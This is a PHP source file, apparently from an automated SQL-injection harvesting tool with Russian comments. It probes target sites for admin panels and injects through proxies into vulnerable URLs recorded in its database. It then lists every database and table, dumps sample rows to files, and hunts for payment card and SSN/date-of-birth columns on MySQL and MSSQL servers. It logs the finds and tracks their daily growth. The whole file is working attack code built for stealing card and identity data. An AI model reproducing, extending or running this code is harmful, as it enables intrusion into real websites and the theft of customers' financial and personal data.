		$file = 'adminpanel.txt';
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/admins/{$domen}");
						
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/admins/{$domen}/$file";
		
		$fp = fopen ($ff, "a+");
		$this->d($ff,'ff');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			if($i==50 or count($urls) == 0)
			{
				//$this->d($i,'count->break'); 
				break;
			}
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew);
			
			
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		//$this->d($tasks,'$tasks');
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
                
                
                
                
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						$url = trim($url);
						

						
                        
                      
						
						if(($status == 200  OR $status == 403 OR $status ==302))
						{
							
                            
                           if($this->search_admin_find_content==true)
                           {
                               
                                $tasks[$url] = curl_multi_getcontent($ch);                    
                                
                                $content = $tasks[$url];
                                 
                             
                                 
                                //echo "<a target='_blank' href='{$url}'>$url - {$status} - POISK !!!</a><br>";
                                $kuku = 'yes';
                                //$this->d($url.' - $url OTVET GOOD ');
                             
                                
                                 
                                 foreach($this->search_admin_page_word as $fff)
                                 {
                                    $fff = trim($fff);    
                                     
                                    if(preg_match("/".$fff."/i",$content)) 
                                    {
                                        
                                         $this->d($url.' - '.$fff."\r\n",'11111111111'); 
                                        
                                        // $this->d($tasks[$url],'content'); 
                                        
                                        fwrite($fp,$url.' - '.$fff."\r\n");
                                        
                                        
                                    }
                                     
                                     
                                 }
                                 
                            }else
                            {
                                
                                // $this->d($tasks[$url],'content'); 
                               
                                echo "<a target='_blank' href='{$url}'>$url - {$status}</a><br>";
                                $kuku = 'yes';
                                //$this->d($url.' - $url OTVET GOOD ');
                                $url = trim($url);
                                fwrite($fp,$url."\r\n");
                               
                               
                           }
                            
						}
						
						
						
						//exit;
						
						//$url = explode(':::', $url);
						//$url['posts']['id'] =  $url[1];
						//$url['posts']['url'] = $url[0];
						
						//if($this->debug==true){$this->d($content,'$content');}
                        
                       // if($this->debug==true){$this->d($url,'$url$url$url$url');}
						
						//$url2 = $url[0];
						
						
						$url = explode(':::', $url);
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							//echo 'zapusk dopolnitelno<br>';	
							
							$urlnew = array_shift($urls);
							
							
							
							$ch = $this->streampars($urlnew);	

							//	$this->d($ch);							
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

		if($kuku !='yes'){
			
			$this->d('ne nashol admonku ');
		}

		curl_multi_close($cmh);

		
		
		
				

	}	 
	
	
    
    
    
	
	/////////  ВЫКАЧКА по 10 значений из всех таблиц ////////////////
	
	function getToAll(){ //поиск колонок с картами у --MYSQL--
		
		if(!isset($this->dump_all_potok)) $this->dump_all_potok = 3;
		
        if($this->dump_all_sib==false)return false;
        
		$this->timeStart = $this->start('getToAll',$this->dump_all_potok);
		
        
        
        
		//$this->Filed->query('UPDATE  `posts` SET  `all_check` =  0 ');
		
		//exit;
		
		
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `order_check` =0 ORDER by  id limit 1");
		
		$poles = $this->Post->query("SELECT * FROM `posts` WHERE `all_check`=0 AND `status`=3 limit 1");
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE  `id`=207");
		
		
		if(count($poles)>0)
		{
			
		}else
		{
			$this->d('netuuuuuuu');
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		
		$this->proxyCheck();
		
		foreach ($poles as $pole)
		{
			$this->workup();
			$this->Filed->query('UPDATE  `posts` SET  `all_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
			$this->FindAllOne($pole['posts']['id']);
			$this->tableOrder = '';
			
			
		}
		
		$this->stop();
		
		die('fse');
		
	}
	
	function FindAllOne ($idf){
		$this->d('FindCountOrderOne - zapusk');
		
		$pass = $this->cards;
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
		
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		
		//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		//$this->d($field,'field');
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		

		
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		
		//	$this->d($this->mysqlInj);
		
		
		
		$password='';
		$i=1;
		
		
		$filename = "./MYSQL_save/".$squle['posts']['domen'].".txt";
		
		$fh = fopen($filename, "a+");
		

							
							
		fwrite($fh,$squle['posts']['url']."\r\n \r\n");
						
		fclose($fh);
		
		

		
		
		
		
		$this->d($pass);
		
		
		
			$pss = trim($pps);
			
			//$this->d('ishem - '.$pps);
			
			$this->workup();
			
		
			$mysql_all = $this->mysqlInj->mysqlGetAllBd();
			
			
			$this->d($mysql_all,'mysql ALLLLL');
			
			
			
			
			if(isset($mysql_all) AND count($mysql_all) >0)
			{
				
				$fh = fopen($filename, "a+");
				
				foreach($mysql_all as $bd)
				{
					
					$text = '';
					
					if($bd == 'information_schema')continue;
					
					
					
					$mysql_bd_table = $this->mysqlInj->mysqlGetTablesByDd($bd);
					
					$this->d($mysql_bd_table,"mysql2222 $bd table");
					
					
					//$count_table = $this->mysqlInj->mysqlGetCountInsert($bd,$mysql_bd_table);
					$this->workup();
					$table_count = 0;
				
						if(isset($mysql_bd_table) AND count($mysql_bd_table) >0)
						{
							
							
							
							
							foreach($mysql_bd_table as $table)
							{
								
								$this->workup();
							
							//	$table =  'tb_product';
								
								$table_count++;
								
								$text = '';
								
								
								$text .="\r\n";
								
								$count_table = $this->mysqlInj->mysqlGetCountInsert($bd,$table);
								$this->d($count_table,'$count_table');
								
								
								
								$text .="\r\n\r\n".$bd.' - '.$table.":($count_table)\r\n";
								
								

							
								$mysql_bd_table_columns = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);
								$this->d($mysql_bd_table_columns,"mysql $bd $table");
								
							
								if(count($mysql_bd_table_columns) >0)
								{
									$y=0;
									foreach($mysql_bd_table_columns as $ccc)
									{
										
										//fwrite($fh,$ccc.' ');
										//$text .= $ccc.';';
										
										$col[] = $ccc;
										$y++;
										//if($i==2)break(3);
									}
								
								
								
									//$text .= "\r\n";
									$text .= implode(',',$col);			
									$text .= "\r\n";									
									//	$this->d($col,'$col');
								}
								
								
								//$mysql_result = $this->mysqlInj->mysqlGetAllValue($bd,$table,$col,10,array(),'');
								
									
								//if($count_table < 11)
								//{
								
								
									for($i=0;$i<10;$i++)
									{
										
										$kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$col,$i,array(),'');
										//if(reset($kuku) !='')$mysql_result[] = $kuku;
										$mysql_result[] =$kuku; 
										//$this->d(reset($kuku),'reset($kuku)');
										//$this->d(end($kuku),'end($kuku)');
										
										
										//$this->d($kuku,'$kuku');
										//exit;
									}
								//}
							
								//if($count_table < 101)
								//{
							
									for($i=90;$i<100;$i++)
									{
										
										$kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$col,$i,array(),'');
										//if(reset($kuku) !='')$mysql_result[] =$kuku;
										$mysql_result[] =$kuku; 
										//$this->d($kuku,'$kuku100');
										
									}
								
								//}
								
								//if($count_table < 501)
								//{
								
									for($i=490;$i<500;$i++)
									{
										
										$kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$col,$i,array(),'');
										//if(reset($kuku) !='')$mysql_result[] =$kuku;
										$mysql_result[] =$kuku; 
										//$this->d($kuku,'$kuku500');
									}
								
								//}
								
								//if($count_table < 1000)
								//{
								
									for($i=990;$i<1000;$i++)
									{
										
										$kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$col,$i,array(),'');
										//if(reset($kuku) !='')$mysql_result[] =$kuku;
										$mysql_result[] =$kuku;
										//$this->d($new,'new');
											//return $new;	
									}
									
								//}
								
								//if($count_table < 2000)
								//{
								
									for($i=1990;$i<2000;$i++)
									{
										
										$kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$col,$i,array(),'');
										//if(reset($kuku) !='')$mysql_result[] =$kuku;
										$mysql_result[] =$kuku;
										//$this->d($new,'new');
											//return $new;	
									}
								//}
								$col = array();
								
								
								$text .= "\r\n";
								
								
								//$this->d($mysql_result,'$mysql_result');
								
								$p='';
								
								foreach($mysql_result as $rrr)
								{
									
									if(count($rrr)>0)
									{
										
											foreach($rrr as $hhh)
											{
												
												$hhh = trim($hhh);
												if($hhh !='' AND strlen($hhh) > 0)
												{
													
													
													$p .= $hhh.' ';
												}			
											}
										
										$text = trim($text);
										
										$text .= "\r\n";	
										$text .=$p;
										
										$p='';
										
									}
								}
								
								$mysql_result = array();
								
								$this->d($text,'$text');
								flush();
								
							
								fwrite($fh,$text);
								
								fwrite($fh,"\r\n+++++++++\r\n");
								
								//if($table_count==20)exit;
								
								//КОНЕЦ ОДНОЙ ТАБЛИЦЫ
							}
							
							
							//$text .="\r\n \r\n";
							fwrite($fh,"\r\n \r\n");
						
							//$this->d($text,'$text');
							
							//exit;
						}
					
						
					
					// КОНЕЦ ОДНОЙ БД	
						
						
						


						
						
					//exit;	
					
					
				}
			}else
			{
				$this->d($pps,'nuhya netu');
			}
			//exit;
		
		

		
	}
	
	
	
	
	
	///ПОИСК КАРТ///
	
	function getCountOrders(){ //поиск колонок с картами у --MYSQL--
		
		if($this->cc_check == false){
			
			echo 'cc_check false';
			
			return false;
		}else
		{
			
				echo 'cc_check TRUE';
		}
		
		
		$this->timeStart = $this->start('getCountOrders',2);
		
		
		
		//exit;
		
		
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `order_check` =0 ORDER by  id limit 1");
		
		$poles = $this->Post->query("SELECT * FROM `posts` WHERE `status`=3 AND `order_check` =0 limit 15");
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `id`=1333641  limit 1");
		//1333641
		
		if(count($poles)>0)
		{
			
		}else
		{
			$this->d('netuuuuuuu');
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		
		
		
		foreach ($poles as $pole)
		{
			$this->workup();
			$this->Filed->query('UPDATE  `posts` SET  `order_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
			$this->FindCountOrderOne($pole['posts']['id']);
			$this->tableOrder = '';
			
			
		}
		
		$this->stop();
		
		die('fse');
		
	}
	
	function FindCountOrderOne ($idf){
		$this->d('FindCountOrderOne - zapusk');
		
		$pass = $this->cards;
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
		
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		
		//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		//$this->d($field,'field');
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		

		
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		
		//	$this->d($this->mysqlInj);
		
		
		
		$password='';
		$i=1;
		
		$this->d($pass);
		
		
		foreach ($pass as $pps)
		{
			$pss = trim($pps);
			
			//$this->d('ishem - '.$pps);
			
			$this->workup();
			
			//$pps ='cc_number';
			
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').') AND ( DATA_TYPE=char('.$this->charcher('char').') OR DATA_TYPE=char('.$this->charcher('varchar').') OR DATA_TYPE=char('.$this->charcher('text').'))');
			
			$this->d($mysql_all,'mysql ALLLLL');
			//exit;
			
			if(isset($mysql_all) AND count($mysql_all) >0)
			{
				
				foreach($mysql_all as $mysql)
				{
					

					
					if(isset($mysql['COLUMN_NAME']) AND $mysql['COLUMN_NAME'] !=null AND $mysql['COLUMN_NAME'] !='null')
					{
						
						
						
						//if(in_array($mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'],$this->card_dubles)){
						
						//$this->d($this->card_dubles,'kuuuuuuuuu DUBLES');
						//continue;
						//}
						
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						
						$this->tableOrder = $table;
						
						
						
						
						
						
						$card.= ' '.$mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						

						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd,$table);
						
						if($count_table > 50)
						{
							
							
							
							$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$count_table."</span>";	
							$card_one2 = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table2})/".$mysql['COLUMN_NAME'];
							$card_one_count = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table})/".$mysql['COLUMN_NAME'];
							$this->d($card_one2,'!!');
							$data['orders'][] = $card_one2;
							
							$uniq = $this->Post->query("SELECT * FROM `orders` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1");
							$count = count($uniq);
							
							$this->d($count,'count');
							
							if($count ==0)
							{
								
								$date = date('Y-m-d h:i:s');	
								
								if($this->Post->query("INSERT INTO orders (
								`post_id`,
								`bd`,
								`table`,
								`column`,
								`count`,
								`card2`,
								`domen`,
								`date`) 
								
								VALUES(
								{$post_id},
								'{$bd}',
								'{$table}',
								'{$column}',
								{$count_table},
								'{$card_one_count}',
								'{$domen}',
								'{$date}')")){
									
									$this->d('v bd uspeshno vstavleno');
									
								}
							}else
							{
								$this->d("SELECT * FROM `orders` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1",'EST D BD!!!');
							}
							//}
						}else{
							
							
							$this->d('menshe 20 !!!!!!',$count_table);
						}
					}
					///exit;
					//exit;
					//sleep(1);
				}
			}else
			{
				$this->d($pps,'nuhya netu');
			}
			//exit;
		}
		

		
	}
	
	
	
	function getCountOrdersMSSQL(){ //поиск колонок с картами у ++MSSQL++
		
		$this->timeStart = $this->start('getCountOrdersMSSQL',1);
		
		
		
		//exit;
		
		
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `order_check` =0 ORDER by  id limit 1");
		
		$poles = $this->Post->query("SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =0 AND `version` LIKE  'm%' limit 7");
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `id`=1333641  limit 1");
		//1333641
		
		if(count($poles)>0)
		{
			
		}else
		{
			$this->d('netuuuuuuu');
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		
		
		
		foreach ($poles as $pole)
		{
			$this->workup();
            $this->Filed->query('UPDATE  `posts` SET  `order_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
			$this->FindCountOrdersMSSQL($pole['posts']['id']);
			$this->tableOrder = '';
			
			
		}
		
		$this->stop();
		
		die('fse');
		
	}
	
	function FindCountOrdersMSSQL ($idf){
		$this->d('FindCountOrdersMSSQL - zapusk');
		
		$pass = $this->ssn_dob;
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
		
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		
		//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		//$this->d($field,'field');
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}

		
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		
		//	$this->d($this->mysqlInj);
		
		
		
			$password='';
			$i=1;
			
			$this->d($pass);
		
	
		
			$data = $this->mysqlInj ->mssqlGetLikeOrders();
			
		
			$this->d($data,'data T');
			
			//exit;
			if(count($data)>0)
			{
				$this->workup();
				$url = parse_url($squle['Post']['url']);
				$ip = gethostbyname($url['host']);

				foreach ($data as $key => $value)
				{
						
						
					//$this->d($mail,'$mail');
					$mail2 = explode(':::',$value);
					$mail['TABLE_SCHEMA'] = $mail2[0];
					$mail['TABLE_NAME'] = $mail2[1];
					$mail['COLUMN_NAME'] = $mail2[2];
					
					$mailcount = $this->mysqlInj->mssqlGetCount($mail['TABLE_SCHEMA'],$mail['TABLE_NAME']);
					
					
					$this->d($mailcount,'$mailcount');
					//exit;
						
				
				
				
					$this->workup();
				
				
					
					
					if(intval($mailcount)!==0 and $mailcount > 20)
					{
						
							
								
								
					
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						
						$this->tableOrder = $table;
						

						$card.= ' '.$mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						

						$count_table = $mailcount;
						
						
						$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$count_table."</span>";	
						$card_one2 = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table2})/".$mysql['COLUMN_NAME'];
						$card_one_count = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table})/".$mysql['COLUMN_NAME'];
						$this->d($card_one2,'!!');
						$data['orders'][] = $card_one2;
						
						$uniq = $this->Post->query("SELECT * FROM `orders` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1");
						$count = count($uniq);
						
						$this->d($count,'count');
						
						if($count ==0)
						{
							
							$date = date('Y-m-d h:i:s');	
							
							if($this->Post->query("INSERT INTO orders (
							`post_id`,
							`bd`,
							`table`,
							`column`,
							`count`,
							`card2`,
							`domen`,
							`date`,
							`typedb`) 
							
							VALUES(
							{$post_id},
							'{$bd}',
							'{$table}',
							'{$column}',
							{$count_table},
							'{$card_one_count}',
							'{$domen}',
							'{$date}',
							'mssql')")){
								
								$this->d('v bd uspeshno vstavleno');
								
							}
						}else
						{
							$this->d("SELECT * FROM `orders` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1",'EST D BD!!!');
							$this->d(mysql_error);
						}
					}else
					{
						$this->d($pps,'nuhya netu');
					}
					//exit;
			
				}

			
			}
		
	
	
	}
	
	
	///ПОИСК КАРТ - допольнительные функции///
	
	
	function count_16(){//orders_card  пишем сюда последние 10 значений
		
		
		
		
		$poles = $this->Post->query("SELECT * FROM `orders` WHERE `count_n` ='0'  ORDER by count  limit 5");
		
		$this->d($poles,'poles');
		
		
		
		$this->timeStart = $this->start('count_16',1);
		
		if(count($poles)>0)
		{
			
		}else
		{
			$this->stop();
			die();
		}
		
		
		
		foreach ($poles as $pole)
		{
			$id = $pole['orders']['id'];
			$bd = $pole['orders']['bd'];
			$table = $pole['orders']['table'];
			$column = $pole['orders']['column'];
			$count = $pole['orders']['count'];
			$this->workup();
			
            
           $this->Filed->query('UPDATE  `orders` SET  `count_n` = 1  WHERE  `id` ='.$id);
            
			$this->count_16_one($id,$pole['orders']['post_id'],$bd,$table,$column,$count);
			
		}
		
		$this->stop();
		
		die('fse');
		
	}
	
	function count_16_one($id,$post_id,$bd,$table,$column,$count){
		
		
		$this->d('count_16_one - zapusk');
		
		$pass = $this->cards;
		
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$post_id.' limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
		if($squle['posts']['order']=='::')
		{
			
			$password = " $bd/$table/$column";
			$this->d($password,'$password');
			//$this->Filed->query('UPDATE  `posts` SET  `order` =  "'.$password.'" WHERE  `id` ='.$post_id);
			
		}
		
		
		
		$post_id = $squle['posts']['id'];
		$order_id = $id;
		$domen = $squle['posts']['domen'];
		
		
		
		
		//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		$column_all = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);
		
	 
		$this->d($column_all,'$column_all');	

        $col_str = '';
        $col_str2 = '';
         
        $out = array_keys($column_all);  
        
         $sq = array("\'",'"',"'",'select','insert','\/','SELECT','INSERT','FROM');
        
		if(count($column_all) > 2 AND $column_all[$out[0]] !='')
		{
			
			$column_all_srt='';
			$k=0;
			foreach($column_all as $col)
			{
                $b=0;
				
                
                foreach($sq as $s)
                    {
                        
                        if(strpos(trim($col),$s))
                        {
                            $this->d($s,'SOVPADENIE');
                            $b=1;
                        }
                    }
                    
                    if($b==0)
                    {
                       $ccc[] = trim($col); 
                    }
                    $b=0;
                
                
				
                
                
                
                if($k<=2)
                {
                    
                    
                      $ccc2[] = trim($col);  
                    
                    
                    
                    
                }
               
               $k++;
                
				
				
					
			}
            
            $ccc2[] = $column;
			
			
			$col_str = implode(';',$ccc);
            
            $col_str2 = implode(';',$ccc2);
            
            
			
			$this->d($col_str,'$col_str');
            
            $this->d($col_str2,'$col_str22');
            
            
          // exit;
            
            
            
            $col_str = mysql_real_escape_string($col_str);
            
           
            
            $col_str = str_replace($sq,'',$col_str);
			
			$this->Post->query("INSERT INTO orders_card (`order_id`,`data`) VALUES({$order_id},'".$col_str."')");
            
            $this->d("INSERT INTO orders_card (`order_id`,`data`) VALUES({$order_id},'".$col_str."')");
			$l = 70; 
			
			
            
            
            
            $kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$ccc,1,array(),'');
            
            //$this->d($kuku,'kuku');
           // exit;
            
            $out = array_keys($kuku); 
            
            if(count($kuku) ==0 or  $kuku[$out[0]] =='')
				{
                    
                    $kuku2 =  $this->mysqlInj->mysqlGetValue($bd,$table,$ccc2,1,array(),'');
                     $this->d($kuku2,'kuku222');
                     
                     
                    
                    $out = array_keys($kuku2);  
                     
                    if(count($kuku2) >1 and  $kuku2[$out[0]] !='')
                    {   
                        $ccc = $ccc2;
                        $this->d($ccc,'22222222222222222CCCC !!!!');
                        
                    } 
                     
                     
                }
                
                
                
            //exit;   
            
			
			for($i=1;$i<$l;$i=$i+5)
			{
			
				$kuku = array();
			
				$kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$ccc,$i,array(),'');
				
				$str = '';
                
                $out = array_keys($kuku);  
				if(count($kuku) >1 and  $kuku[$out[0]] !='')
				{
						foreach($kuku as $yyy)
						{
							if($yyy !=''){
                                $yyy = str_replace($sq,'',$yyy);
                                $str .= $yyy.';';}
						}

				}
                
                	//$this->d($str,'$str');
                    //exit;
                
                
                
                if($str !='')
					{
						$this->d($str,'$str');
						
						$this->Post->query("INSERT INTO orders_card (`order_id`,`data`) VALUES({$order_id},'$str')");
					
						$this->d("INSERT INTO orders_card (`order_id`,`data`) VALUES({$order_id},'$str')");
						
					}
                
                
                
                //else{
                  //  $this->d($ku,'kuku');
                   /// $this->stop_str = 1;
                   /// break;    
                //}
						
			}
				


		} 
		
		
			//$this->d($mysql_result,'$mysql_result');
			//exit;
			
			
					
					
			
					
				//if($this->Post->query($str_all))
				//{
				//}
						
					
			
		
		
		
		
		
		
		//$this->d($g,"UPDATE  `orders` SET  `count_n` = 1  WHERE  `bd` ='$bd' AND `table`='$table'");
		
		//if($g>=2)
		//{
			//$this->Filed->query("UPDATE  `orders` SET  `count_n` = 1  WHERE  `bd` ='$bd' AND `table`='$table'");
			
		//}
		

		
	}
	
	
	function count_new(){ //считает дневную разницу чтобы видеть
		
		
		
		
		//$poles22 = $this->Post->query("SELECT * FROM `orders` WHERE `check_count` =1 AND `count_new`=0  limit 1000");
		
		
		//foreach ($poles22 as $pole22)
		//{
			//$id = $pole22['orders']['id'];
			//$count = $pole22['orders']['count'];
			//$this->d($pole22,'$pole22');
			
			//$this->Filed->query('UPDATE  `orders` SET  `count_new` = '.$count.' WHERE  `id` = '.$id);
		
		//}
		
		
		$poles = $this->Post->query("SELECT count(*) FROM `orders` WHERE `check_count` =0");
		
		
		
		$this->d($poles[0][0]['count(*)'],'poles');

		
		
		
		$this->timeStart = $this->start('count_new',1);
		
		if($poles[0][0]['count(*)']>0)
		{
			$this->d($poles[0][0]['count(*)'],'$poles[0][0][count(*)] >0');
		}else
		{
			
			$this->d($poles[0][0]['count(*)'],'$poles[0][0][count(*)] < === 0');
			$this->Filed->query('UPDATE  `orders` SET  `check_count` = 0 WHERE  `check_count` = 1');	
			$this->d('UPDATE  `orders` SET  `check_count` = 0 WHERE  `check_count` = 1');
		}
		
		
		$poles = $this->Post->query("SELECT * FROM `orders` WHERE `check_count` =0  ORDER by count DESC limit 300 ");
		
		$this->d($poles,'poles');
		//exit;
		if(count($poles)>0)
		{
			
		}else
		{
			$this->stop();
			die();
		}
		
		foreach ($poles as $pole)
		{
			$id = $pole['orders']['id'];
			$bd = $pole['orders']['bd'];
			$table = $pole['orders']['table'];
			$column = $pole['orders']['column'];
			$count = $pole['orders']['count'];
			$this->workup();
			
			$this->count_new_one($id,$pole['orders']['post_id'],$bd,$table,$column,$count);
			
		}
		
		$this->stop();
		
		die('fse');
	}
	
	function count_new_one($id,$post_id,$bd,$table,$column,$count){
		
		$this->d('count_new_one pusk');
		
		$pass = $this->cards;
		
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$post_id.'  limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
	
		
		$post_id = $squle['posts']['id'];
		$order_id = $id;
		$domen = $squle['posts']['domen'];
		
		
	
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		//$column_all = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);
		
		$count_table_new = $this->mysqlInj->mysqlGetCountInsert($bd,$table);
		
		
		
		
		if($count_table_new=='')$count_table_new=$count;
		
		$razn = $count-$count_table_new;
		
		$this->d($count,'$count_table_OLD');
		$this->d($count_table_new,'$count_table_NEW');
		$this->d($razn);
		
		$date = date('Y-m-d h:i:s');
		if($this->Filed->query('UPDATE  `orders` SET  `count_new` =  '.$count_table_new.',`count_new2` ='.$razn.',`check_count` = 1,`date_new`= "'.$date.'" WHERE  `bd` = "'.$bd.'" AND `table`= "'.$table.'"')){
			
			$this->d('update_new');
			$this->d('UPDATE  `orders` SET  `count_new` =  '.$count_table_new.',`check_count` = 1,`date_new`= "'.$date.'" WHERE  `bd` = "'.$bd.'" AND `table`= "'.$table.'"');
		}else{
			$this->d('UPDATE  `orders` SET  `count_new` =  '.$count_table_new.',`check_count` = 1,`date_new`= "'.$date.'" WHERE  `bd` = "'.$bd.'" AND `table`= "'.$table.'"');
			
		}
		//exit;
		
	}
	
	
	
	
	
	
	
	
	
	//////// Дампинг выборочный///////
	
	
	function dumping_one($shag = 5){ // слив всего и пассом и мыл в одиночном режиме с выбраными полями черз LIMIT
		
		
		
		
		if($this->multidump_one==false)
		{
			
			$this->d('vikluchen');
			return false;
		}
		
		
		$this->shag = $shag;
		
		set_time_limit(0);
		$this->r = rand(1,100);
		
		
		
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
